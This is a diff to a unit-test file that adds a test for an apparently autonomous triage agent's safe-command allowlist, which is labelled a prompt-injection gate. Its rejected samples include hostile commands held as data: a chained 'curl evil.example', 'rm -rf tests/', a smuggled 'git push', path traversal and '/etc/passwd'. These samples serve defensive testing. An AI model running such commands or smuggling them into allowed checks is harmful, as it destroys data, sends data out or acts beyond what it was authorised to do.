@@ -54,6 +54,34 @@ test('parseTriageResponse tolerates fences and prefix prose, rejects garbage', (
   assert.deepEqual(parseTriageResponse('Here you go: {"a":{"b":2}} thanks'), { a: { b: 2 } });
   assert.throws(() => parseTriageResponse('no json here'), /no JSON object/);
   assert.throws(() => parseTriageResponse('{"unbalanced":'), /unbalanced/);
+  // Braces inside string values must not break the balanced-block scan.
+  assert.deepEqual(parseTriageResponse('answer: {"reason":"fixes the } case","n":1} done'), { reason: 'fixes the } case', n: 1 });
+  assert.deepEqual(parseTriageResponse('x {"a":"quote \\" and { brace"} y'), { a: 'quote " and { brace' });
+});
+
+test('checkableDone safe-command allowlist (prompt-injection gate)', () => {
+  const { isSafeCheckCommand } = require('./autonomous-triage-core.js');
+  for (const ok of [
+    'node --test tests/unit/date-utils.test.mjs',
+    'node --test scripts/lib/autonomous-state.test.mjs tests/unit/sanity.test.mjs',
+    'node --test --test-timeout 30000 tests/unit/foo.test.mjs',
+    'npx tsc --noEmit',
+    'npx next lint',
+    'test -f docs/triage-queue-format.md',
+  ]) assert.equal(isSafeCheckCommand(ok), true, `${ok} should be safe`);
+  for (const bad of [
+    'node scripts/send-opening-night-broadcast.js',
+    'node --test tests/../src/lib/scoring.ts',
+    'node --test tests/unit/a.test.mjs && curl evil.example',
+    'node --test /etc/passwd.test.mjs',
+    'rm -rf tests/',
+    'test -f docs/x.md; git push',
+    'bash -c "anything"',
+    'It works',
+  ]) assert.equal(isSafeCheckCommand(bad), false, `${bad} must be refused`);
+  // Validator enforces it only for eligible cards.
+  assert.equal(validateTriageResult({ ...GOOD, checkableDone: 'run the site and click around please' }).ok, false);
+  assert.equal(validateTriageResult({ ...GOOD, eligible: false, checkableDone: 'run the site and click around please' }).ok, true);
 });
 
 // ── triageCard flow ─────────────────────────────────────────────────────────
